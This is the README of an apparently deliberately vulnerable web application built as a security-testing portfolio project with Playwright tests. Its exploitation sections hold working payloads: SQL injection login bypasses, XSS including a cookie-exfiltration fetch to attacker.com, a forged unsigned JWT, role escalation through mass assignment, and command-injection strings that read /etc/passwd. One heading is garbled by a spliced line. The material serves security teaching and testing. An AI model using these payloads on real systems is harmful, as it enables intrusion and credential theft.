# Security Testing Demo Project

> A comprehensive vulnerable web application designed to demonstrate advanced security testing skills, automated testing frameworks, and knowledge of OWASP Top 10 vulnerabilities with enterprise-grade reporting.

## 🚨 Disclaimer

**This application contains intentional security vulnerabilities for educational and demonstration purposes only!**
- 🚫 DO NOT deploy this to production
- 🚫 DO NOT use in any real-world application  
- 🚫 Only use in controlled, isolated environments
- ✅ Safe for security research and education

## 🎯 Purpose

This project showcases practical expertise in:
- **Security Testing**: Comprehensive OWASP Top 10 vulnerability assessment
- **Test Automation**: Advanced Playwright framework with TypeScript
- **ML Integration**: Machine learning-based anomaly detection for security
- **CI/CD Security**: Automated security testing in GitHub Actions
- **Report Generation**: Multiple report formats (Allure, HTML, JSON)
- **DevSecOps**: Security-first development and testing practices

## 🚀 Quick Start

### Prerequisites
- **Node.js** (v18 or higher) 
- **npm** or **yarn**
- **Git**
- **Java 11+** (optional, for full Allure reports)

### Installation & Setup

```bash
# Clone the repository
git clone <repository-url>
cd juice-shop

# Install dependencies  
npm install

# Install Playwright browsers
npx playwright install --with-deps

# Start the vulnerable application
npm start
```

The application will be available at `http://localhost:3000`

### 🔬 Run Security Tests

```bash
# Quick security validation
npm test                    # Core suites (API + E2E + ML-Anomaly) + generates real Allure UI (Java required)
npm run test:report         # Generate HTML report

# Advanced testing
npm run test:ml-anomaly     # ML-based anomaly detection
npm run test:all           # Complete test suite

# Interactive debugging
npm run test:ui            # Visual test runner
```

## 📊 Test Reports & Documentation

Multiple report formats are available:

### 🌐 **Live Dashboards**
- **Test Dashboard**: `http://localhost:3000/test-dashboard.html`
- **Main App**: `http://localhost:3000`

### 📈 **Report Generation**
```bash
# Playwright HTML Report (recommended)
npm run test:report

# Simple Allure-style Report (no Java required)  
npm run test:allure-simple

# Complete Java-free report (runs core suites + generates grouped HTML)
npm run test:complete-report

# Full Allure Report (requires Java)
npm run test:allure
npm run test:allure-open

# JSON Results for CI/CD
npm run test:results
```

### 🔗 **CI/CD Integration**
- **GitHub Actions**: Automated testing on push/PR
- **Artifact Publishing**: Reports published as artifacts  
- **GitHub Pages**: Live reports deployed automatically
- **Security Scanning**: Trivy vulnerability scanning

## 📁 Project Structure

### 🏗️ **Core Application**
```
.
├── 📦 package.json                 # Dependencies and npm scripts
├── ⚙️  playwright.config.ts        # Playwright configuration
├── 🚀 server.js                   # Vulnerable Express.js application
├── 📋 tsconfig.json               # TypeScript configuration
├── 🔒 allure.config.json          # Allure reporting configuration
├── 🌐 public/                     # Static web assets
│   ├── index.html                # Main application UI
│   └── test-dashboard.html       # Test results dashboard
└── 📖 README.md                  # This documentation
```

### 🧪 **Test Architecture**
```
test/
├── 🔧 global-setup.ts              # Test environment initialization
├── 🔧 global-teardown.ts           # Test environment cleanup  
├── 📦 fixtures/                    # Shared test utilities
│   ├── e2e-fixtures.ts            # Browser-based test fixtures
│   ├── ml-anomaly-fixtures.ts     # ML anomaly detection fixtures
│   └── zap-fixtures.ts            # ZAP security scanning fixtures
├── 📄 pages/                       # Page Object Model classes
│   ├── HomePage.ts                # Homepage interactions  
│   ├── LoginPage.ts               # Authentication flows
│   ├── RegistrationPage.ts        # User registration
│   ├── SearchPage.ts              # Search functionality
│   ├── AdminPage.ts               # Admin panel operations
│   ├── IDORPage.ts                # IDOR vulnerability testing
│   └── AnomalyDetectionAPI.ts     # ML API interactions
├── 🔍 utils/                       # Testing utilities
│   ├── AttackPatternDetector.ts   # ML attack pattern detection
│   ├── BehaviorAnalyzer.ts        # User behavior analysis  
│   ├── MLModelValidator.ts        # ML model validation
│   └── TrafficAnalyzer.ts         # Network traffic analysis
├── 📡 api/                         # API-level security tests
│   ├── api.spec.ts               # General API functionality
│   ├── authentication.spec.ts   # JWT and auth bypass tests  
│   ├── idor.spec.ts              # Insecure Direct Object Reference
│   └── vulnerabilities.spec.ts  # Combined API vulnerability tests
├── 🌐 e2e/                        # Browser-based security tests
│   ├── home.spec.ts              # Homepage and navigation
│   ├── login.safe.spec.ts        # Safe login functionality
│   ├── registration.spec.ts     # User registration and validation
│   ├── search.spec.ts            # Search baseline + secure-expectation checks + opt-in DOM XSS demo
│   ├── vulnerabilities.spec.ts  # Placeholder (chain moved to ZAP suite)
│   ├── zap_a01_broken_access_control.spec.ts      # OWASP A01
│   ├── zap_a02_cryptographic_failures.spec.ts     # OWASP A02
│   ├── zap_a03_injection.spec.ts                  # OWASP A03 (XSS)
│   ├── zap_a03_sql_injection.spec.ts             # OWASP A03 (SQLi)
│   ├── zap_a04_insecure_design.spec.ts           # OWASP A04
│   ├── zap_a05_security_misconfiguration.spec.ts # OWASP A05
│   ├── zap_a06_vulnerable_components.spec.ts     # OWASP A06
│   ├── zap_a07_identification_authentication_failures.spec.ts # A07
│   ├── zap_a08_software_data_integrity_failures.spec.ts       # A08
│   ├── zap_a09_security_logging_monitoring_failures.spec.ts   # A09
│   ├── zap_a10_server_side_request_forgery.spec.ts           # A10
│   └── zap_workflow_chain.spec.ts        # Canonical chained workflow demo (single scenario)
├── 🤖 ml-anomaly/                 # Machine Learning security tests
│   ├── attack-patterns.spec.ts   # ML-based attack detection
│   ├── baseline-behavior.spec.ts # Normal user behavior patterns
│   ├── behavioral-anomalies.spec.ts # Behavioral anomaly detection
│   ├── ml-validation.spec.ts     # ML model performance validation
│   └── traffic-patterns.spec.ts  # Network traffic analysis
└── 🌱 seed.spec.ts               # Test data initialization
```

### 🛠️ **Reports & Scripts**

```
.
├── allure-results/              # Raw Allure result files (from Playwright)
├── allure-report/               # Full Allure UI (generated; Java required)
├── allure-report-simple/        # Java-free HTML summary (generated)
├── allure-report-complete/      # Java-free "complete" HTML report w/ per-project grouping (generated)
├── playwright-report/           # Native Playwright HTML report
├── test-results/                # Artifacts (screenshots/traces on failure)
└── test-results.json            # Machine-readable summary

check-java-allure.js             # Java dependency checker / wrapper for Allure CLI
generate-simple-report.js        # Java-free report generator (allure-report-simple/)
generate-complete-report.js      # Java-free complete report generator (allure-report-complete/)
generate-test-dashboard.js       # Dashboard generator
generate-test-results.js         # JSON results processor
install-allure.sh                # Allure setup helper
```

## 🧪 Test Suite Architecture

### 🎯 **Three-Tier Testing Model**

1. **🟢 Baseline Tests** (Always Safe for CI)
   ```bash
   npm test                 # Core functionality tests
   npm run test:api         # API security validation  
   npm run test:e2e         # Browser security tests
   ```

2. **🟡 Security Expectation Tests** (Post-Hardening Validation)
   ```bash
   SECURE_MODE=1 npm test   # Tests that should pass after security fixes
   ```

3. **🔴 Vulnerability Demonstration Tests** (Controlled Environment Only)  
   ```bash
   RUN_VULN_TESTS=1 npm test # Explicit exploit demonstrations
   ```

### 🧭 **Canonical Coverage Map (post-dedup)**

The suite intentionally avoids duplicate coverage by assigning one canonical spec per scenario:

| Scenario | Canonical spec | Layer | Notes |
|---|---|---|---|
| SQLi login bypass | `test/e2e/zap_a03_sql_injection.spec.ts` | E2E (ZAP) | Primary demo for auth bypass via SQL injection |
| SQLi-style probe in search | `test/api/api.spec.ts` | API | Lightweight injection probe for `/api/search` |
| Reflected XSS in search | `test/e2e/zap_a03_injection.spec.ts` | E2E (ZAP) | Canonical XSS reflection checks |
| IDOR enumeration | `test/api/idor.spec.ts` | API | Canonical user enumeration loop via `/api/user/:id` |
| Token stored after normal login | `test/e2e/login.safe.spec.ts` | E2E | Baseline functional assertion |
| Config exposure (`/api/config`) | `test/e2e/zap_a02_cryptographic_failures.spec.ts` | E2E (ZAP) | Baseline wiring + secure-mode expectation + opt-in vuln demo |
| Chained workflow demo | `test/e2e/zap_workflow_chain.spec.ts` | E2E (ZAP) | Single canonical chain; `test/e2e/vulnerabilities.spec.ts` is a skipped pointer |

### 🤖 **ML-Enhanced Security Testing**

Advanced machine learning integration for:
- **Attack Pattern Detection**: Automated identification of attack vectors
- **Behavioral Analysis**: User behavior anomaly detection
- **Traffic Pattern Analysis**: Network-level security monitoring
- **Model Validation**: ML security model performance testing

```bash
npm run test:ml-anomaly   # Run ML-enhanced security tests
```

### 📊 **Comprehensive Reporting**

Multiple report formats for different needs:

| Report Type | Command | Java Required | Features |
|-------------|---------|---------------|----------|
| **Playwright HTML** | `npm run test:report` | ❌ | Native Playwright features, traces, videos |
| **Simple Allure** | `npm run test:allure-simple` | ❌ | Allure-style UI, statistics, no Java |
| **Complete (Java-free)** | `npm run test:complete-report` | ❌ | Allure-style UI + per-project grouping |
| **Full Allure** | `npm run test:allure` | ☕ | Complete Allure features, history, trends |
| **JSON Results** | `npm run test:results` | ❌ | Programmatic access, CI/CD integration |
| **Test Dashboard** | `npm run test:dashboard` | ❌ | Overview of all reports and status |

### 🚀 **Running Tests**

```bash
# 🔧 Initial Setup
npm install
npx playwright install --with-deps

# 🟢 SAFE TESTS (CI-friendly)
npm test                    # Run core test suites (API + E2E + ML-Anomaly) - RECOMMENDED
npm run test:comprehensive  # Run all test suites including security tests
npm run test:api           # API endpoint security tests only
npm run test:e2e           # Browser-based security tests only  
npm run test:ml-anomaly    # ML-enhanced security testing

# 🔍 DEVELOPMENT & DEBUGGING  
npm run test:ui            # Interactive visual test runner
npm run test:report        # Generate and view HTML report
npm run test:dashboard     # Generate test results dashboard

# 🟡 SECURITY TESTING (Controlled Environment)
SECURE_MODE=1 npm test     # Post-hardening security validation
RUN_VULN_TESTS=1 npm test  # Vulnerability demonstrations (NEVER in CI)

# 🎯 TARGETED TESTING
npx playwright test login               # Login-related tests only
npx playwright test --grep "SQL"       # SQL injection tests
npx playwright test --project=api      # API tests only  
npx playwright test --project=chromium # Browser tests only
```

### 📈 **Report Generation**

```bash
# 📊 Generate Reports
npm run test:report          # Playwright HTML (recommended)
npm run test:allure-simple   # Allure-style (no Java required)
npm run test:complete-report # Java-free grouped report (runs core suites)
npm run test:allure          # Full Allure (requires Java)
npm run test:results         # JSON results for automation

# 🌐 View Reports  
npm run test:allure-open     # Open Allure in browser
open allure-report/          # Open Full Allure UI (if generated)
open playwright-report/      # Open Playwright report
open allure-report-simple/   # Open simple report
open allure-report-complete/ # Open complete Java-free report

# 🔄 Continuous Reporting
npm run test:allure-serve    # Live Allure server with auto-refresh
```

### Test Coverage

### Test Reports and Documentation

This project generates comprehensive test reports in multiple formats:

#### 🔗 Live Test Reports
- **Test Dashboard**: [http://localhost:3000/test-dashboard.html](http://localhost:3000/test-dashboard.html)
- **GitHub Pages**: Reports are automatically published to GitHub Pages on CI runs

#### 📊 Report Types

1. **Allure Report** - Interactive test execution report
   ```bash
   # Generate Allure report locally
   npm run test:allure
   
   # Open Allure report in browser
   npm run test:allure-open
   
   # Serve Allure report with history
   npm run test:allure-serve
   ```

2. **Playwright HTML Report** - Native detailed test report
   ```bash
   # Generate and view Playwright report
   npm run test:report
   ```

3. **JSON Test Results** - Programmatic test results
   ```bash
   # Generate JSON results
   npm run test:results
   ```

#### 🚀 CI/CD Integration

The project automatically publishes test reports as artifacts in GitHub Actions:

- **Allure Report**: Interactive dashboard with trends and history
- **Playwright HTML Report**: Detailed execution logs and traces  
- **JSON Results**: Raw data for programmatic analysis
- **Test Screenshots**: Failure screenshots and videos (on failure)

**Artifact Retention:**
- Test reports: 30 days
- Allure history: 90 days  
- Failure screenshots: 7 days

#### 📈 Report Features

**Allure Report includes:**
- Test execution trends and history
- Detailed failure analysis with stack traces
- Test categorization and tagging
- Performance metrics and timing
- Environment information
- Flaky test detection
- Custom attachments (screenshots, logs)

**Playwright Report includes:**
- Step-by-step test execution
- Network activity logs
- Console messages
- Trace viewer integration
- Error screenshots and videos
- Test retry information

**API Tests** (test/api/):
- Search injection probing on `/api/search` (SQLi-style payloads)
- IDOR user enumeration without authentication (`/api/user/:id`)
- JWT forgery / weak verification checks (`/api/admin`)
- Mass assignment privilege escalation (`/api/register`)

**E2E Tests** (test/e2e/):
- Baseline UI wiring (home/login/registration/search)
- OWASP Top 10 ZAP-style suites for canonical vulnerability demos (XSS, SQLi, config exposure, etc.)
- One canonical chained workflow scenario (`zap_workflow_chain.spec.ts`)

### Why Playwright?

Unlike Juice Shop's Cypress + Frisby approach, Playwright provides:
- Single framework for both API and E2E testing
- Better performance and modern API
- Native TypeScript support
- Cross-browser testing capabilities

## Vulnerabilities Implemented

### 1. SQL Injection (OWASP A03)
**Location:** `/api/login` endpoint

**Vulnerability:** Direct string concatenation in SQL query without parameterization.

**Exploitation:**
```bash
# Bypass authentication
Username: admin' OR '1'='1'--
Password: anything

# Or using comment injection
Username: admin'--
Password: (leave empty)
```

**Impact:** Complete authentication bypass, unauthorized access to any account.

---

### 2. Cross-Site Scripting - XSS (OWASP A03)
**Location:** `/api/search` endpoint and search functionality

**Vulnerability:** Unsanitized user input reflected in HTML response.

**Exploitation:**
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag with error handler -->
<img src=x onerror=alert('XSS')>

<!-- Cookie theft (if cookies weren't httpOnly) -->
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

**Impact:** Session hijacking, credential theft, malicious redirects.

---

### 3. Insecure Direct Object Reference - IDOR (OWASP A01)
**Location:** `/api/user/:id` endpoint

**Vulnerability:** No authorization checks, any user can access other users' sensitive data.

**Exploitation:**
```bash
# Access user 1's data
GET /api/user/1

# Access user 2's data
GET /api/user/2

# Access admin data
GET /api/user/3
```

**Impact:** Unauthorized access to sensitive user information including secret_data field.

---

### 4. Broken Authentication (OWASP A07)
**Location:** `/api/admin` endpoint

**Vulnerability:** Weak JWT verification using `jwt.decode()` instead of `jwt.verify()`, accepts unsigned tokens.

**Exploitation:**
```javascript
// Create a token with "none" algorithm
const fakeToken = btoa(JSON.stringify({alg:"none"})) + '.' + 
                  btoa(JSON.stringify({role:"admin",username:"attacker"})) + '.';

// Use in request
fetch('/api/admin', {
  headers: { 'Authorization': 'Bearer ' + fakeToken }
});
```

**Impact:** Complete authentication bypass, unauthorized admin access.

---

### 5. Sensitive Data Exposure (OWASP A02)
**Location:** `/api/config` endpoint

**Vulnerability:** Exposes sensitive configuration data including secret keys and API credentials.

**Exploitation:**
```bash
# Simply visit the endpoint
GET /api/config

# Returns:
{
  "secret_key": "super-secret-key",
  "api_keys": {
    "stripe": "sk_test_fake_key",
    "aws": "AKIAIOSFODNN7EXAMPLE"
  }

```

**Impact:** Exposure of secrets enabling further attacks, data breaches.

---

### 6. Mass Assignment (OWASP A04)
**Location:** `/api/register` endpoint

**Vulnerability:** Accepts arbitrary user input without validation, allows role escalation.

**ExPlaywright** - Automated browser testing and vulnerability verification
- **ploitation:**
```bash
# Register as admin
POST /api/register
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123",
  "email": "hacker@evil.com",
  "role": "admin"
}
```

**Impact:** Privilege escalation, unauthorized admin access.

---

### 7. Command Injection (Simulated)
**Location:** `/api/ping` endpoint

**Vulnerability:** Unsanitized user input used in system commands.

**Exploitation:**
```bash
# Command chaining
GET /api/ping?host=localhost;cat /etc/passwd

# Or with pipes
GET /api/ping?host=localhost | whoami
```

**Impact:** Remote code execution, complete system compromise (in production scenario).

---

## Testing Tools

Recommended tools for testing these vulnerabilities:

- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Automated vulnerability scanning
- **SQLMap** - Automated SQL injection testing
- **Postman** - API endpoint testing
- **Browser DevTools** - XSS and client-side testing
- **JWT.io** - JWT token manipulation

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) (the inspiration)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

## Mitigation Strategies

For each vulnerability, here's how to fix it:

### SQL Injection
```javascript
// Use parameterized queries
db.get('SELECT * FROM users WHERE username = ? AND password = ?', 
  [username, password], callback);
```

### XSS
```javascript
// Sanitize output
const sanitized = escapeHtml(userInput);
// Use Content-Security-Policy headers
// Validate and encode all user input
```

### IDOR
```javascript
// Implement proper authorization
if (req.user.id !== requestedUserId && req.user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### Broken Authentication
```javascript
// Properly verify JWT tokens
jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
// Implement proper session management
```

### Sensitive Data Exposure
```javascript
// Never expose configuration endpoints
// Use environment variables
// Implement proper access controls
```

### Mass Assignment
```javascript
// Whitelist allowed fields
const allowedFields = ['username', 'password', 'email'];
const userData = pick(req.body, allowedFields);
userData.role = 'user'; // Set server-side
```

## Interview Talking Points

When presenting this project to HR/recruiters:

1. **Understanding:** Demonstrate deep knowledge of each vulnerability
2. **Exploitation:** Show how each can be exploited (ethically)
3. **Mitigation:** Explain proper fixes and security best practices
4. **Tools:** Discuss testing methodologies and tools used
5. **Impact:** Articulate business impact of each vulnerability
6. **Standards:** Reference OWASP Top 10 and industry standards

## License

MIT License - Feel free to use for educational purposes.

## About

Created as a portfolio project to demonstrate:
- Security testing expertise
- Full-stack development skills
- Understanding of web application vulnerabilities
- Practical penetration testing knowledge

**Remember:** This is for learning and demonstration only. Always practice ethical hacking and obtain proper authorization before testing any systems.
